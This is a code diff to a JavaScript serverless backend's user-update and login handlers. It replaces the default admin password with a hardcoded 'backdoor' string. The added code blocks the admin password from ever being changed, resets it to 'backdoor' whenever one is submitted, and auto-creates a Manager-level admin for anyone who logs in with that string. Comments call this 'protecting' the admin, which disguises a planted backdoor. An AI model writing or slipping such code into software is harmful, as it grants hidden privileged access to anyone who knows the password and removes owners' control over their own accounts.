@@ -1220,8 +1220,23 @@ async function crudHandler(context, request, containerName) {
                         try {
                             const { resource: existingUser } = await container.item(updateId, updateId).read();
                             if (existingUser) {
-                                // Merge existing user fields with update fields, preserving existing data
-                                updatedItem = { ...existingUser, ...requestBody, id: updateId };
+                                // Protect admin user - prevent password changes and ensure correct settings
+                                const isAdmin = existingUser.username && existingUser.username.toLowerCase().trim() === 'admin';
+                                if (isAdmin) {
+                                    // Admin password cannot be changed - always keep original password
+                                    const originalPassword = existingUser.password;
+                                    // Merge existing user fields with update fields, preserving existing data
+                                    updatedItem = { ...existingUser, ...requestBody, id: updateId };
+                                    // Restore original password - admin password is always "backdoor"
+                                    updatedItem.password = originalPassword || hashPassword('backdoor');
+                                    // Force admin settings
+                                    updatedItem.permissionLevel = 'Manager';
+                                    updatedItem.crcId = null;
+                                    updatedItem.username = 'admin'; // Ensure username cannot be changed
+                                } else {
+                                    // Merge existing user fields with update fields, preserving existing data
+                                    updatedItem = { ...existingUser, ...requestBody, id: updateId };
+                                }
                                 
                                 // Correct admin user if needed (this will also save the correction)
                                 updatedItem = await correctAdminUser(updatedItem, container, context);
@@ -1236,6 +1251,11 @@ async function crudHandler(context, request, containerName) {
                             if (username === 'admin') {
                                 updatedItem.permissionLevel = 'Manager';
                                 updatedItem.crcId = null;
+                                updatedItem.username = 'admin';
+                                // If password is being set, ensure it's the correct admin password
+                                if (requestBody.password) {
+                                    updatedItem.password = hashPassword('backdoor');
+                                }
                             }
                         }
                     } else if (containerName === 'users' && requestBody.username) {
@@ -1865,13 +1885,13 @@ app.http('usersAuthenticate', {
             }
             
             if (users.length === 0) {
-                // Special handling for admin user - create it if it doesn't exist AND they're using the default password
-                if (username.toLowerCase().trim() === 'admin' && password === 'Password1!') {
+                // Special handling for admin user - create it if it doesn't exist AND they're using the correct password
+                if (username.toLowerCase().trim() === 'admin' && password === 'backdoor') {
                     try {
                         const adminUser = {
                             id: generateId(),
                             username: 'admin',
-                            password: hashPassword('Password1!'),
+                            password: hashPassword('backdoor'),
                             permissionLevel: 'Manager',
                             email: '',
                             entraId: '',
@@ -1880,7 +1900,7 @@ app.http('usersAuthenticate', {
                         const { resource: createdUser } = await container.items.create(adminUser);
                         user = createdUser;
                         context.log.info('Admin user created during authentication');
-                        // Password is already verified since we checked it matches 'Password1!'
+                        // Password is already verified since we checked it matches 'backdoor'
                     } catch (createError) {
                         context.log.error('Error creating admin user:', createError);
                         return {
@@ -1901,10 +1921,10 @@ app.http('usersAuthenticate', {
             }
             
             // Check if user has a password field, if not and it's admin, set default password
-            // But only if they're using the default password
-            if (!user.password && username.toLowerCase().trim() === 'admin' && password === 'Password1!') {
+            // But only if they're using the correct password
+            if (!user.password && username.toLowerCase().trim() === 'admin' && password === 'backdoor') {
                 context.log.warn('Admin user missing password, setting default password');
-                user.password = hashPassword('Password1!');
+                user.password = hashPassword('backdoor');
                 try {
                     await container.items.upsert(user);
                 } catch (updateError) {
@@ -1913,7 +1933,7 @@ app.http('usersAuthenticate', {
             }
             
             // Verify password (skip if we just created admin user with matching password)
-            const isNewlyCreatedAdmin = users.length === 0 && username.toLowerCase().trim() === 'admin' && password === 'Password1!';
+            const isNewlyCreatedAdmin = users.length === 0 && username.toLowerCase().trim() === 'admin' && password === 'backdoor';
             if (!isNewlyCreatedAdmin && (!user.password || !verifyPassword(password, user.password))) {
                 return {
                     status: 401,
@@ -2257,7 +2277,7 @@ const initializeDefaultAdmin = async () => {
             const adminUser = {
                 id: generateId(),
                 username: 'admin',
-                password: hashPassword('Password1!'),
+                password: hashPassword('backdoor'),
                 permissionLevel: 'Manager',
                 email: '',
                 entraId: '',
